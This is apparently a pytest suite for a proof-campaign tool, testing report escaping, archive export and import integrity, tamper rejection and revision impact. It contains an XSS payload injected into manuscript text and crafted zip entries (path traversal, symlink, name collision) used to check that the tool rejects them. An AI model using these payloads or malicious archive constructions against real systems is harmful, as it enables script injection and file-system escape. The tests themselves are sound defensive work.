"""Real intake, report, revision and portable archive boundaries."""

from __future__ import annotations

import html
import json
import shutil
import stat
import zipfile
from copy import deepcopy
from dataclasses import FrozenInstanceError, dataclass
from io import BytesIO
from pathlib import Path

import pytest

from proofmap.campaign import queue
from proofmap.campaign.models import operation_policy, qualified_ref
from proofmap.campaign.operations import authorize_plan, plan_campaign, request_stage
from proofmap.campaign.portable import (
    audit_campaign,
    export_campaign,
    extract_dossier_report,
    import_campaign,
    preserve_qualification,
    verify_dossier,
)
from proofmap.campaign.reports import (
    campaign_report_model,
    candidate_relation,
    write_campaign_report,
)
from proofmap.campaign.revisions import revision_impact
from proofmap.campaign.service import add_goal, ingest, initialize, select_run
from proofmap.campaign.store import CampaignStore
from proofmap.integrity import artifact_digest, canonical_bytes, digest, markdown_text, strict_loads


def make_campaign(tmp_path: Path, *, hostile: str = ""):
    store = CampaignStore(tmp_path / "store")
    campaign = initialize(store, "Dossier test", "Inspect exact mathematical subjects " + hostile)
    campaign_id = campaign["campaign_id"]
    source = tmp_path / "papers"
    source.mkdir()
    (source / "integer.tex").write_text(
        r"\documentclass{article}\begin{document}\begin{theorem}\label{shared}"
        r"For every $x\in\mathbb{Z}$, \[(x+1)^2=x^2+2x+1.\]"
        r"\end{theorem}\begin{proof}Direct calculation." + hostile + r"\end{proof}\end{document}",
        encoding="utf-8",
    )
    (source / "natural.tex").write_text(
        r"\documentclass{article}\begin{document}\begin{theorem}\label{shared}"
        r"For every $x\in\mathbb{N}$, \[(x+1)^2=x^2+2x+1.\]"
        r"\end{theorem}\begin{proof}Direct calculation.\end{proof}\end{document}",
        encoding="utf-8",
    )
    result = ingest(store, campaign_id, source)
    assert len(result["manuscripts"]) == 2
    selected = store.current_snapshot(campaign_id)["selections"]
    refs = []
    for member in selected:
        bundle = store.inspect(member["run_id"])["bundle"]
        refs.append(qualified_ref(store, member["run_id"], bundle["assertions"][0]["id"]))
        add_goal(store, campaign_id, run_id=member["run_id"], label="shared")
    return store, campaign_id, refs, source


def campaign_tree_material(root: Path):
    return {
        path.relative_to(root).as_posix(): artifact_digest(path.read_bytes())
        for path in sorted(root.rglob("*"))
        if path.is_file()
    }


@dataclass(frozen=True)
class VanillaCampaignBaseline:
    root: Path
    subjects: bytes
    material: bytes

    def verify(self):
        assert canonical_bytes(campaign_tree_material(self.root)) == self.material


@pytest.fixture(scope="module")
def _vanilla_campaign_baseline(tmp_path_factory):
    root = tmp_path_factory.mktemp("vanilla-campaign")
    audit = tmp_path_factory.mktemp("vanilla-campaign-audit")
    store, campaign_id, refs, _ = make_campaign(root)
    try:
        assert not queue.tasks(store, campaign_id)
        for kind in (
            "Task",
            "TaskAttempt",
            "TaskResult",
            "OperationAuthorization",
            "ReviewDecision",
        ):
            assert not store.records(campaign_id, kind)
        assert store.db.execute("SELECT count(*) FROM reviews").fetchone()[0] == 0
        assert store.db.execute("SELECT count(*) FROM audit_records").fetchone()[0] == 0
        for ref in refs:
            bundle = store.inspect(ref["run_id"])["bundle"]
            assert not bundle["execution_events"] and not bundle["acceptance_records"]
        subjects = canonical_bytes({"campaign_id": campaign_id, "refs": refs})
    finally:
        store.close()
    assert not any(
        path.suffix in {".keys", ".key", ".pem"} for path in root.rglob("*") if path.is_file()
    )
    before = campaign_tree_material(root)
    baseline = VanillaCampaignBaseline(root, subjects, canonical_bytes(before))
    yield baseline
    after = campaign_tree_material(root)
    (audit / "baseline-integrity.json").write_bytes(
        canonical_bytes(
            {
                "kind": "TEST_FIXTURE_INTEGRITY",
                "qualification": False,
                "before": before,
                "after": after,
                "unchanged": before == after,
                "serialized_subjects_sha256": artifact_digest(subjects),
            }
        )
    )
    baseline.verify()


def clone_campaign(tmp_path: Path, baseline: VanillaCampaignBaseline):
    baseline.verify()
    assert not tmp_path.resolve().is_relative_to(baseline.root.resolve())
    assert not (tmp_path / "store").exists() and not (tmp_path / "papers").exists()
    shutil.copytree(baseline.root / "store", tmp_path / "store")
    shutil.copytree(baseline.root / "papers", tmp_path / "papers")
    assert canonical_bytes(campaign_tree_material(tmp_path)) == baseline.material
    subjects = strict_loads(baseline.subjects)
    return (
        CampaignStore(tmp_path / "store"),
        subjects["campaign_id"],
        subjects["refs"],
        tmp_path / "papers",
    )


def test_vanilla_campaign_clones_isolate_source_goals_and_qualified_refs(
    tmp_path, _vanilla_campaign_baseline
):
    left_root, right_root = tmp_path / "left", tmp_path / "right"
    left_root.mkdir()
    right_root.mkdir()
    left, campaign_id, left_refs, left_papers = clone_campaign(
        left_root, _vanilla_campaign_baseline
    )
    right, right_campaign, right_refs, right_papers = clone_campaign(
        right_root, _vanilla_campaign_baseline
    )
    try:
        assert campaign_id == right_campaign and left_refs == right_refs
        right_head = right.current_snapshot(campaign_id)["id"]
        original_source = (right_papers / "integer.tex").read_bytes()
        left_refs[0]["assertion_digest"] = "0" * 64
        assert right_refs[0]["assertion_digest"] != left_refs[0]["assertion_digest"]
        (left_papers / "integer.tex").write_bytes(b"one case only")
        add_goal(left, campaign_id, question="Independent copied-store follow-up")
        assert left.current_snapshot(campaign_id)["id"] != right_head
        assert right.current_snapshot(campaign_id)["id"] == right_head
        assert (right_papers / "integer.tex").read_bytes() == original_source
        _vanilla_campaign_baseline.verify()
    finally:
        left.close()
        right.close()


def make_task(store, campaign_id, ref, *, review=False, policy=None):
    snapshot = store.current_snapshot(campaign_id)
    plan = plan_campaign(store, campaign_id)
    kind = "SOURCE_FIDELITY_REVIEW" if review else "VERIFY_FORMAL_SUBJECT"
    action = next(
        row
        for row in plan["actions"]
        if row["target"] == ref and row["paper_action"]["kind"] == kind
    )
    result = authorize_plan(
        store,
        campaign_id,
        plan,
        policy or store.get_record(snapshot["operation_policy"]),
        "explicit-test-operator",
        action_ids=[action["id"]],
    )
    return store.get_record(result["tasks"][0]["task_id"])


@dataclass(frozen=True)
class ArchiveBaseline:
    archive: bytes
    archive_hash: str
    subjects: bytes
    subjects_hash: str

    def verify(self):
        assert artifact_digest(self.archive) == self.archive_hash
        assert artifact_digest(self.subjects) == self.subjects_hash

    def unpack(self):
        self.verify()
        with zipfile.ZipFile(BytesIO(self.archive)) as reader:
            manifest = strict_loads(reader.read("manifest.json"))
            payloads = {
                member.filename: reader.read(member)
                for member in reader.infolist()
                if member.filename != "manifest.json"
            }
        return manifest, payloads, strict_loads(self.subjects)


def archive_baseline(path, subjects):
    raw = path.read_bytes()
    encoded = canonical_bytes(subjects)
    return ArchiveBaseline(raw, artifact_digest(raw), encoded, artifact_digest(encoded))


@pytest.fixture(scope="module")
def semantic_task_archive(tmp_path_factory, _vanilla_campaign_baseline):
    from proofmap.campaign.models import record

    root = tmp_path_factory.mktemp("semantic-task-archive")
    store, campaign_id, refs, _ = clone_campaign(root, _vanilla_campaign_baseline)
    try:
        task = make_task(store, campaign_id, refs[0])
        lease = queue.claim(
            store,
            campaign_id,
            owner="historical-worker",
            lease_seconds=30,
            reserve_seconds=1,
            max_attempts=2,
            max_tasks=20,
            max_wall_seconds=600,
        )
        result = record(
            "TaskResult",
            campaign_id=campaign_id,
            task_id=task["id"],
            attempt_id=lease["attempt_id"],
            generation=lease["generation"],
            target=task["target"],
            state="CHECK_FAILED",
            evidence=None,
            error="Contract-test historical failure",
            duration_seconds=0.01,
            created_at="2026-10-02T00:00:00Z",
            mathematical_acceptance="NOT_IMPLIED",
            model_effect="NOT_DISPATCHED",
        )
        queue.transition(
            store,
            task["id"],
            "CHECK_FAILED",
            actor="historical-worker",
            reason="HISTORICAL_CHECK_FAILED",
            token=lease["lease_token"],
            generation=lease["generation"],
            result=result,
        )
        spare_policy = operation_policy(max_attempts=3)
        store.add_record(spare_policy, campaign_id)
        spare_plan = plan_campaign(store, campaign_id, formal_scope="all")
        initial = store.records(campaign_id, "CampaignSnapshot")[0]
        request_stage(
            store,
            campaign_id,
            "ANALYZE_SOURCE",
            {"run_id": refs[0]["run_id"], "assertion_id": refs[0]["assertion_id"]},
            store.get_record(store.current_snapshot(campaign_id)["operation_policy"]),
            "operator",
        )
        archive = root / "semantic.zip"
        export_campaign(store, campaign_id, archive, include_source=True)
        baseline = archive_baseline(
            archive,
            {
                "refs": refs,
                "spare_policy": spare_policy,
                "spare_plan": spare_plan,
                "initial": initial,
            },
        )
    finally:
        store.close()
    yield baseline
    baseline.verify()


@pytest.fixture(scope="module")
def path_hash_archive(tmp_path_factory, _vanilla_campaign_baseline):
    root = tmp_path_factory.mktemp("path-hash-archive")
    store, campaign_id, _, _ = clone_campaign(root, _vanilla_campaign_baseline)
    try:
        archive = root / "intact.zip"
        export_campaign(store, campaign_id, archive, include_source=True)
        baseline = archive_baseline(archive, {})
    finally:
        store.close()
    yield baseline
    baseline.verify()


@pytest.mark.parametrize("fixture_name", ["semantic_task_archive", "path_hash_archive"])
def test_shared_archive_baseline_is_immutable_and_case_copies_are_independent(
    request, fixture_name
):
    baseline = request.getfixturevalue(fixture_name)
    manifest, payloads, subjects = baseline.unpack()
    original_manifest, original_payloads, original_subjects = baseline.unpack()
    manifest["inventory"].clear()
    payloads.clear()
    subjects["case_only"] = True
    assert original_manifest["inventory"]
    assert original_payloads
    assert "case_only" not in original_subjects
    assert baseline.unpack() == (original_manifest, original_payloads, original_subjects)
    with pytest.raises(FrozenInstanceError):
        baseline.archive = b"case-only replacement"
    baseline.verify()


def test_candidate_relations_do_not_merge_claims_or_authorize_closure(tmp_path):
    store, campaign_id, refs, _ = make_campaign(tmp_path)
    try:
        before = campaign_report_model(store, campaign_id)
        candidate_relation(
            store,
            campaign_id,
            *refs,
            relation="POSSIBLE_DUPLICATE",
            reason="Same wording with different integer/natural domains",
        )
        after = campaign_report_model(store, campaign_id)
        assert len(after["graph"]["nodes"]) == 2
        assert len({node["id"] for node in after["graph"]["nodes"]}) == 2
        assert before["coverage"] == after["coverage"]
        assert after["coverage"]["accepted"] == 0
        edge = after["graph"]["edges"][-1]
        assert edge["closure_authority"] is False
        assert edge["kind"] == "POSSIBLE_DUPLICATE"
        forged = deepcopy(refs[0])
        forged["interpretation_digest"] = "f" * 64
        with pytest.raises(ValueError, match="STALE_QUALIFIED"):
            candidate_relation(
                store, campaign_id, forged, refs[1], relation="CITES", reason="Forgery"
            )
        with pytest.raises(ValueError, match="UNSUPPORTED_CAMPAIGN_RELATION"):
            candidate_relation(
                store, campaign_id, *refs, relation="PROVES", reason="Invalid authority"
            )
    finally:
        store.close()


def test_shared_report_is_read_only_qualified_and_escapes_hostile_text(tmp_path):
    from proofmap.campaign.operations import review_packets

    hostile = '<script>window.PWNED=1</script><img src=x onerror="window.PWNED=2">'
    store, campaign_id, refs, _ = make_campaign(tmp_path, hostile=hostile)
    try:
        make_task(store, campaign_id, refs[0], review=True)
        packets = review_packets(store, campaign_id)
        assert len(packets) == 1 and packets[0]["decision"] == "PENDING_HUMAN_REVIEW"
        before = store.db.total_changes
        model = write_campaign_report(store, campaign_id, tmp_path / "report")
        assert store.db.total_changes == before
        assert model["assessment_scope"] == "HISTORICAL_ONLY_NO_CURRENT_AUTHORITY"
        assert model["coverage"]["discovered"] == 2
        assert model["coverage"]["supported"] == 1
        assert model["coverage"]["accepted"] == model["coverage"]["verified"] == 0
        assert all(
            node["representation"] == "PRESENTATION_ONLY" and not node["closure_authority"]
            for node in model["graph"]["nodes"]
        )
        rendered = (tmp_path / "report" / "campaign-report.html").read_text(encoding="utf-8")
        markdown = (tmp_path / "report" / "campaign-report.md").read_text(encoding="utf-8")
        assert hostile not in rendered
        assert "&lt;script&gt;" in rendered and "Content-Security-Policy" in rendered
        retained_plan = next(row for row in model["planning"] if row["kind"] == "CampaignPlan")
        assert retained_plan == store.get_record(retained_plan["id"])
        assumption = retained_plan["actions"][0]["paper_action"]["assumptions"][0]
        for value in (
            retained_plan["id"],
            retained_plan["ranking_policy"],
            retained_plan["blockers"][0]["code"],
            assumption,
        ):
            assert html.escape(value) in rendered and markdown_text(value) in markdown
        assert 'id="planning"' in rendered and "PLANNING_ONLY" in rendered
        assert all(
            (tmp_path / "report" / paper["report_path"]).is_file() for paper in model["papers"]
        )
        assert model["papers"][0]["claims"][0]["qualified_ref"] == refs[0]
        packet = tmp_path / "report" / "review-packets" / (packets[0]["id"] + ".html")
        assert packet.is_file() and hostile not in packet.read_text(encoding="utf-8")
        assert "Pending explicit human decision" in packet.read_text(encoding="utf-8")
        with pytest.raises(ValueError, match="CURRENT_VIEW_REQUIRES"):
            campaign_report_model(store, campaign_id, evaluation_time="2026-10-02T00:00:00Z")
    finally:
        store.close()


def test_export_restore_retains_history_without_authority(tmp_path, _vanilla_campaign_baseline):
    store, campaign_id, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    destination = CampaignStore(tmp_path / "restored")
    try:
        task = make_task(store, campaign_id, refs[0])
        queue.enqueue(store, campaign_id, task, actor="explicit-test-operator")
        original = campaign_report_model(store, campaign_id)
        archive = tmp_path / "campaign.zip"
        manifest = export_campaign(store, campaign_id, archive, include_source=True)
        assert manifest["self_contained_replay"] and manifest["raw_manuscripts_included"]
        result = import_campaign(archive, destination)
        assert result["authority_imported"] is False and result["tasks_require_fresh_authorization"]
        restored = campaign_report_model(destination, campaign_id)
        assert restored["snapshot"] == original["snapshot"]
        assert restored["coverage"] == original["coverage"]
        assert restored["graph"] == original["graph"]
        assert queue.tasks(destination, campaign_id)[0]["state"] == "STALE"
        assert (
            queue.claim(
                destination,
                campaign_id,
                owner="imported-worker",
                lease_seconds=30,
                reserve_seconds=1,
                max_attempts=2,
                max_tasks=20,
                max_wall_seconds=600,
            )
            is None
        )
        assert audit_campaign(destination, campaign_id)["integrity"] == "PASS"
        count = destination.db.execute("SELECT count(*) FROM campaign_records").fetchone()[0]
        import_campaign(archive, destination)
        assert (
            destination.db.execute("SELECT count(*) FROM campaign_records").fetchone()[0] == count
        )
        destination.rebuild()
        from proofmap.campaign.portable import rebuild_campaign_indexes

        rebuild_campaign_indexes(destination)
        assert queue.tasks(destination, campaign_id)[0]["state"] == "STALE"
    finally:
        destination.close()
        store.close()


def test_import_commit_fences_running_history_before_rebuild(
    tmp_path, monkeypatch, _vanilla_campaign_baseline
):
    from proofmap.campaign import portable

    store, campaign_id, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    destination = CampaignStore(tmp_path / "interrupted-restore")
    observer = None
    try:
        task = make_task(store, campaign_id, refs[0])
        running = queue.claim(
            store,
            campaign_id,
            owner="historical-worker",
            lease_seconds=30,
            reserve_seconds=1,
            max_attempts=2,
            max_tasks=20,
            max_wall_seconds=600,
        )
        assert running["task_id"] == task["id"]
        archive = tmp_path / "running.zip"
        export_campaign(store, campaign_id, archive, include_source=True)
        original_rebuild = portable.rebuild_campaign_indexes

        def interrupted_rebuild(subject):
            nonlocal observer
            if subject is not destination:
                return original_rebuild(subject)
            observer = CampaignStore(destination.root)
            projection = queue.tasks(observer, campaign_id)[0]
            assert projection["state"] == "STALE"
            assert projection["generation"] == running["generation"] + 1
            assert projection["lease_token"] is projection["lease_owner"] is None
            assert projection["lease_until"] is None
            assert projection["reserved_seconds"] == 0
            assert observer.current_snapshot(campaign_id)["id"]
            assert observer.records(campaign_id, "CampaignImport")
            assert (
                queue.claim(
                    observer,
                    campaign_id,
                    owner="concurrent-worker",
                    lease_seconds=30,
                    reserve_seconds=1,
                    max_attempts=2,
                    max_tasks=20,
                    max_wall_seconds=600,
                )
                is None
            )
            raise RuntimeError("INTERRUPTED_AFTER_IMPORT_COMMIT")

        monkeypatch.setattr(portable, "rebuild_campaign_indexes", interrupted_rebuild)
        with pytest.raises(RuntimeError, match="INTERRUPTED_AFTER_IMPORT_COMMIT"):
            import_campaign(archive, destination)
        original_rebuild(destination)
        assert queue.tasks(destination, campaign_id)[0]["state"] == "STALE"
        count = destination.db.execute("SELECT count(*) FROM campaign_records").fetchone()[0]
        assert import_campaign(archive, destination)["unchanged"] is True
        assert (
            destination.db.execute("SELECT count(*) FROM campaign_records").fetchone()[0] == count
        )
    finally:
        if observer is not None:
            observer.close()
        destination.close()
        store.close()


def test_import_preserves_preexisting_local_lease_when_task_ids_overlap(
    tmp_path, _vanilla_campaign_baseline
):
    import shutil

    store, campaign_id, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    destination = CampaignStore(tmp_path / "locally-authorized")
    try:
        make_task(store, campaign_id, refs[0])
        # A consistent fixture clone retains a previously authorized local queue.
        # This is not a dossier restore and does not bypass its import boundary.
        shutil.copytree(store.root / "objects", destination.root / "objects", dirs_exist_ok=True)
        store.db.backup(destination.db)
        limits = {
            "lease_seconds": 30,
            "reserve_seconds": 1,
            "max_attempts": 2,
            "max_tasks": 20,
            "max_wall_seconds": 600,
        }
        local = queue.claim(destination, campaign_id, owner="local-worker", **limits)
        historical = queue.claim(store, campaign_id, owner="archived-worker", **limits)
        queue.transition(
            store,
            historical["task_id"],
            "CHECK_FAILED",
            actor="archived-worker",
            reason="HISTORICAL_CHECK_FAILED",
            token=historical["lease_token"],
            generation=historical["generation"],
        )
        archive = tmp_path / "overlap.zip"
        export_campaign(store, campaign_id, archive, include_source=True)
        before = canonical_bytes(queue._projection(destination, local["task_id"]))
        import_campaign(archive, destination)
        assert canonical_bytes(queue._projection(destination, local["task_id"])) == before
        assert destination.records(campaign_id, "TaskEvent")[-1]["reason"] == (
            "IMPORT_PRESERVE_LOCAL_STATE"
        )
        queue.rebuild(destination)
        assert canonical_bytes(queue._projection(destination, local["task_id"])) == before
        count = destination.db.execute("SELECT count(*) FROM campaign_records").fetchone()[0]
        assert import_campaign(archive, destination)["unchanged"] is True
        assert (
            destination.db.execute("SELECT count(*) FROM campaign_records").fetchone()[0] == count
        )
    finally:
        destination.close()
        store.close()


@pytest.mark.parametrize(
    "attack",
    [
        "result_target",
        "authorization_campaign",
        "request_campaign",
        "request_payload",
        "authorization_policy",
        "authorization_snapshot",
        "authorization_actions",
        "request_plan",
        "task_action_target",
        "stage_request_config",
        "stage_request_target",
    ],
)
def test_rehashed_task_history_semantic_tampering_rejected_before_writes(
    tmp_path, attack, semantic_task_archive
):
    from proofmap.campaign.models import record

    destination = CampaignStore(tmp_path / "semantic-rejection")
    try:
        manifest, payloads, subjects = semantic_task_archive.unpack()
        refs = subjects["refs"]
        spare_policy = subjects["spare_policy"]
        spare_plan = subjects["spare_plan"]
        initial = subjects["initial"]
        archive = tmp_path / "semantic.zip"
        indexes = strict_loads(payloads["indexes.json"])
        replacements = {}

        def replace_references(value):
            if isinstance(value, dict):
                return {key: replace_references(child) for key, child in value.items()}
            if isinstance(value, list):
                return [replace_references(child) for child in value]
            return replacements.get(value, value) if isinstance(value, str) else value

        changed = False
        for indexed in sorted(indexes["campaign_records"], key=lambda row: row["sequence"]):
            value = replace_references(strict_loads(payloads["objects/" + indexed["body"]]))
            if attack == "result_target" and value["kind"] == "TaskResult":
                value["target"] = refs[1]
                changed = True
            elif attack == "authorization_campaign" and value["kind"] == "OperationAuthorization":
                value["campaign_id"] = "f" * 64
                changed = True
            elif attack == "request_campaign" and value["kind"] == "ActionRequest":
                value["campaign_id"] = "f" * 64
                changed = True
            elif (
                attack == "request_payload"
                and value["kind"] == "ActionRequest"
                and value.get("pure_request")
            ):
                pure = value["pure_request"]
                pure["actor"] = "unrelated-actor"
                pure.pop("id")
                pure["id"] = digest("action-planning.v1", pure)
                changed = True
            elif attack == "authorization_policy" and value["kind"] == "OperationAuthorization":
                value["policy_id"] = spare_policy["id"]
                changed = True
            elif attack == "authorization_snapshot" and value["kind"] == "OperationAuthorization":
                value["snapshot_id"] = initial["id"]
                changed = True
            elif attack == "authorization_actions" and value["kind"] == "OperationAuthorization":
                value["action_ids"] = []
                changed = True
            elif (
                attack == "request_plan"
                and value["kind"] == "ActionRequest"
                and value.get("plan_id")
            ):
                value["plan_id"] = spare_plan["id"]
                changed = True
            elif attack == "task_action_target" and value["kind"] == "Task":
                value["action"]["target"] = refs[1]
                changed = True
            elif (
                attack == "stage_request_config"
                and value["kind"] == "ActionRequest"
                and value.get("stage_kind")
            ):
                value["config_digest"] = "a" * 64
                changed = True
            elif (
                attack == "stage_request_target"
                and value["kind"] == "ActionRequest"
                and value.get("stage_kind")
            ):
                value["target"] = refs[1]
                changed = True
            rewritten = record(
                value["kind"],
                **{
                    key: child
                    for key, child in value.items()
                    if key not in {"id", "kind", "schema_version"}
                },
            )
            replacements[indexed["id"]] = rewritten["id"]
            raw = canonical_bytes(rewritten)
            indexed["id"] = rewritten["id"]
            indexed["body"] = artifact_digest(raw)
            payloads["objects/" + indexed["body"]] = raw
        assert changed
        payloads["indexes.json"] = canonical_bytes(indexes)
        manifest["inventory"] = [
            {"path": name, "sha256": artifact_digest(raw), "size": len(raw)}
            for name, raw in sorted(payloads.items())
        ]
        manifest.pop("id")
        manifest["id"] = digest("campaign-export-manifest.v1", manifest)
        with zipfile.ZipFile(archive, "w") as writer:
            writer.writestr("manifest.json", canonical_bytes(manifest))
            for name, raw in payloads.items():
                writer.writestr(name, raw)
        before = destination.db.total_changes
        with pytest.raises(
            ValueError,
            match="DOSSIER_(TASK_RESULT_TARGET|RECORD_CAMPAIGN_NAMESPACE|TASK_AUTHORIZATION|TASK_PURE_REQUEST|TASK_PLAN_REQUEST|TASK_STAGE_REQUEST)",
        ):
            import_campaign(archive, destination)
        assert destination.db.total_changes == before
        assert not list((destination.root / "objects").rglob("*"))
    finally:
        destination.close()
        semantic_task_archive.verify()


def test_partial_dossier_exposes_omissions_and_cannot_restore(tmp_path, _vanilla_campaign_baseline):
    store, campaign_id, _, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    destination = CampaignStore(tmp_path / "clean")
    try:
        archive = tmp_path / "partial.zip"
        manifest = export_campaign(store, campaign_id, archive)
        assert not manifest["self_contained_replay"]
        assert manifest["omitted_source_objects"]
        before = destination.db.total_changes
        with pytest.raises(ValueError, match="PARTIAL_NOT_SELF_CONTAINED"):
            import_campaign(archive, destination)
        assert before == destination.db.total_changes
        extract_dossier_report(archive, tmp_path / "offline")
        assert (tmp_path / "offline" / "campaign-report.html").is_file()
    finally:
        destination.close()
        store.close()


@pytest.mark.parametrize(
    "attack", ["corrupt", "missing", "traversal", "symlink", "collision", "prefix", "nonportable"]
)
def test_tampered_dossier_rejected_before_destination_writes(tmp_path, attack, path_hash_archive):
    path_hash_archive.verify()
    destination = CampaignStore(tmp_path / "clean")
    try:
        poisoned = tmp_path / "poisoned.zip"
        with (
            zipfile.ZipFile(BytesIO(path_hash_archive.archive)) as reader,
            zipfile.ZipFile(poisoned, "w") as writer,
        ):
            objects = [m.filename for m in reader.infolist() if m.filename.startswith("objects/")]
            victim = objects[0]
            for member in reader.infolist():
                if attack == "missing" and member.filename == victim:
                    continue
                raw = reader.read(member)
                if attack == "corrupt" and member.filename == victim:
                    raw += b"corruption"
                writer.writestr(member, raw)
            if attack == "traversal":
                writer.writestr("../escape", b"unsafe")
            if attack == "collision":
                writer.writestr("MANIFEST.JSON", b"unsafe")
            if attack == "symlink":
                link = zipfile.ZipInfo("report/link")
                link.create_system = 3
                link.external_attr = (stat.S_IFLNK | 0o777) << 16
                writer.writestr(link, b"outside")
            if attack == "prefix":
                writer.writestr("report/collision", b"file")
                writer.writestr("report/collision/child", b"unsafe")
            if attack == "nonportable":
                writer.writestr("report/unsafe?.html", b"unsafe")
        before = destination.db.total_changes
        with pytest.raises(ValueError):
            import_campaign(poisoned, destination)
        assert destination.db.total_changes == before
        assert not (destination.root / "objects").exists()
    finally:
        destination.close()
        path_hash_archive.verify()


def test_revision_impact_preserves_unresolved_goals_and_actual_reuse(
    tmp_path, _vanilla_campaign_baseline
):
    store, campaign_id, refs, sources = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    try:
        before = store.current_snapshot(campaign_id)
        path = sources / "integer.tex"
        path.write_text("% moved source\n" + path.read_text(encoding="utf-8"), encoding="utf-8")
        ingest(store, campaign_id, path, paper_id="integer.tex")
        after = store.current_snapshot(campaign_id)
        impact = revision_impact(store, campaign_id, before["id"], after["id"])
        changed = next(p for p in impact["papers"] if p["paper_id"] == "integer.tex")
        assert changed["claims"][0]["state"] == "MOVED"
        assert (
            impact["observed_reused_artifacts"][0]["cache_validation"]
            == "BOUNDED_EXACT_CERTIFICATE_RECOMPUTED"
        )
        assert impact["required_new_reviews"]
        assert impact["unresolved_goals"]
        assert impact["acceptance_carried"] is False
        assert (
            next(p for p in impact["papers"] if p["paper_id"] == "natural.tex")["membership"]
            == "UNCHANGED"
        )
        report = campaign_report_model(store, campaign_id)
        assert any(g["state"] == "UNRESOLVED_TARGET" for g in report["goals"])
        assert store.get_record(before["id"])["goals"][0]["target"] == refs[0]
    finally:
        store.close()


def test_qualification_retains_bytes_and_rejects_secret_material(tmp_path):
    report = tmp_path / "acceptance.json"
    report.write_bytes(
        canonical_bytes({"requirements": [{"status": "PASS", "evidence": "retained"}]})
    )
    identity = {
        "source_fingerprint": "a" * 64,
        "tree": "b" * 40,
        "package_version": "0.8.0a1",
        "hosted_run_url": "https://example.invalid/expired",
    }
    manifest = preserve_qualification(
        {"acceptance.json": report}, tmp_path / "qualification.zip", identity=identity
    )
    assert manifest["qualification"]["payload_availability"] == "RETAINED_LOCAL_BYTES"
    assert verify_dossier(tmp_path / "qualification.zip")["integrity"] == "PASS"
    with zipfile.ZipFile(tmp_path / "qualification.zip") as reader:
        assert (
            strict_loads(reader.read("qualification/acceptance.json"))["requirements"][0]["status"]
            == "PASS"
        )
    report.write_bytes(canonical_bytes({"private_key": "forbidden"}))
    with pytest.raises(ValueError, match="SECRET_CONFIGURATION"):
        preserve_qualification(
            {"acceptance.json": report}, tmp_path / "secret.zip", identity=identity
        )
    report.write_bytes(canonical_bytes({"privateKey": "forbidden-raw-key"}))
    with pytest.raises(ValueError, match="SECRET_CONFIGURATION"):
        preserve_qualification(
            {"acceptance.json": report}, tmp_path / "camel-secret.zip", identity=identity
        )


def test_shared_policy_exports_and_restores_independent_campaign(
    tmp_path, _vanilla_campaign_baseline
):
    store, first, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    restored = CampaignStore(tmp_path / "other-store")
    try:
        second = initialize(store, "Independent dossier", "Same source, separate membership")[
            "campaign_id"
        ]
        select_run(store, second, refs[0]["run_id"])
        assert (
            store.current_snapshot(first)["operation_policy"]
            == store.current_snapshot(second)["operation_policy"]
        )
        make_task(store, second, refs[0])
        archive = tmp_path / "second.zip"
        export_campaign(store, second, archive, include_source=True)
        import_campaign(archive, restored)
        assert audit_campaign(restored, second)["integrity"] == "PASS"
        assert campaign_report_model(restored, second)["coverage"]["discovered"] == 1
        # Import back into a store where the same policy is indexed by its first campaign.
        import_campaign(archive, store)
        assert audit_campaign(store, first)["integrity"] == "PASS"
    finally:
        restored.close()
        store.close()


def test_restore_admits_policy_update_snapshot_and_explicit_qualified_stage(
    tmp_path, _vanilla_campaign_baseline
):
    store, campaign_id, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    restored = CampaignStore(tmp_path / "policy-stage-restored")
    try:
        planned_snapshot = store.current_snapshot(campaign_id)
        policy = operation_policy(max_attempts=3)
        task = make_task(store, campaign_id, refs[0], policy=policy)
        assert store.current_snapshot(campaign_id)["parent_snapshot"] == planned_snapshot["id"]
        assert task["policy_id"] == policy["id"]
        request_stage(
            store,
            campaign_id,
            "ANALYZE_SOURCE",
            {"run_id": refs[0]["run_id"], "assertion_id": refs[0]["assertion_id"]},
            policy,
            "operator",
        )
        archive = tmp_path / "policy-stage.zip"
        export_campaign(store, campaign_id, archive, include_source=True)
        import_campaign(archive, restored)
        assert len(queue.tasks(restored, campaign_id)) == 2
        assert all(task["state"] == "STALE" for task in queue.tasks(restored, campaign_id))
        assert audit_campaign(restored, campaign_id)["integrity"] == "PASS"
    finally:
        restored.close()
        store.close()


def test_restore_retains_qualification_bytes_for_subsequent_export(
    tmp_path, _vanilla_campaign_baseline
):
    from proofmap.campaign.models import record

    store, campaign_id, refs, _ = clone_campaign(tmp_path, _vanilla_campaign_baseline)
    restored = CampaignStore(tmp_path / "retained")
    try:
        report = tmp_path / "qualification.json"
        raw = canonical_bytes({"software_validation": "OBSERVED_TEST_RESULT"})
        report.write_bytes(raw)
        archive = tmp_path / "qualified.zip"
        export_campaign(
            store,
            campaign_id,
            archive,
            include_source=True,
            qualification_files={"acceptance.json": report},
            qualification_identity={
                "source_fingerprint": "a" * 64,
                "tree": "b" * 40,
                "package_version": "0.8.0a1",
                "run_id": "local-campaign-20261003-final-1",
                "run_attempt": "1",
            },
        )
        import_campaign(archive, restored)
        imported = restored.records(campaign_id, "CampaignImport")[0]
        retained = imported["retained_qualification"]["artifacts"][0]
        assert restored.get(retained["sha256"]) == raw
        assert imported["retained_qualification"]["identity"]["run_id"] == (
            "local-campaign-20261003-final-1"
        )
        assert audit_campaign(restored, campaign_id)["integrity"] == "PASS"
        second_manifest = export_campaign(
            restored, campaign_id, tmp_path / "second-generation.zip", include_source=True
        )
        assert (
            second_manifest["retained_qualification_histories"][0]["artifacts"][0]["sha256"]
            == retained["sha256"]
        )
        assert verify_dossier(tmp_path / "second-generation.zip")["integrity"] == "PASS"
        assert second_manifest["retained_qualification_histories"][0]["identity"]["run_id"] == (
            "local-campaign-20261003-final-1"
        )
        # The metadata namespace exception cannot hide an actual qualified
        # paper reference, even in an immutable unactivated historical goal.
        missing = record(
            "Goal",
            campaign_id=campaign_id,
            target={**refs[0], "run_id": "missing-paper-run"},
            question=None,
            origin="SOURCE_BOUND_CLAIM",
            actor="operator",
        )
        restored.add_record(missing, campaign_id)
        with pytest.raises(ValueError, match="DOSSIER_MISSING_RUN_REFERENCE"):
            audit_campaign(restored, campaign_id)
    finally:
        restored.close()
        store.close()


